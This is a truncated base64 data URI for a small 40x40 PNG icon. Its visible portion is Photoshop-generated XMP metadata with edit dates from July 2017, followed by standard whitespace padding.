"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAMAAAC7IEhfAAA7rmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMwNjcgNzkuMTU3NzQ3LCAyMDE1LzAzLzMwLTIzOjQwOjQyICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgICAgICAgICAgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIgogICAgICAgICAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoTWFjaW50b3NoKTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wOkNyZWF0ZURhdGU+MjAxNy0wNy0xM1QxNjowMDoyNSswMjowMDwveG1wOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4yMDE3LTA3LTIyVDAwOjUyOjAyKzAyOjAwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAxNy0wNy0yMlQwMDo1MjowMiswMjowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPGRjOmZvcm1hdD5pbWFnZS9wbmc8L2RjOmZvcm1hdD4KICAgICAgICAgPHBob3Rvc2hvcDpDb2xvck1vZGU+MzwvcGhvdG9zaG9wOkNvbG9yTW9kZT4KICAgICAgICAgPHhtcE1NOkluc3RhbmNlSUQ+eG1wLmlpZDoxN2U4OTRjNS1hZjMzLTQ1MWEtYWI1YS0zNjI3NjhlZDY3ZDU8L3htcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4bXBNTTpEb2N1bWVudElEPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDo1NjA4ZGMzMy1hZTQ0LTExN2EtOTQzNC1mNzhiNzcwZWZlNWE8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDoxNWRhMDNiZS1kM2QwLTQ0NGUtOTVjMC1kYjNmNWQ3MTIzNzM8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jcmVhdGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6MTVkYTAzYmUtZDNkMC00NDRlLTk1YzAtZGIzZjVkNzEyMzczPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE3LTA3LTEzVDE2OjAwOjI1KzAyOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6NDY1NDFiNjEtODEyZC00NmRlLTgzNGEtY2EwZjQ1N2Y5MjllPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE3LTA3LTIyVDAwOjQyOjE2KzAyOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6MTdlODk0YzUtYWYzMy00NTFhLWFiNWEtMzYyNzY4ZWQ2N2Q1PC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE3LTA3LTIyVDAwOjUyOjAyKzAyOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICAgICA8dGlmZjpYUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpZUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICAgICAgICAgPGV4aWY6Q29sb3JTcGFjZT42NTUzNTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpQaXhlbFhEaW1lbnNpb24+NDA8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+NDA8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg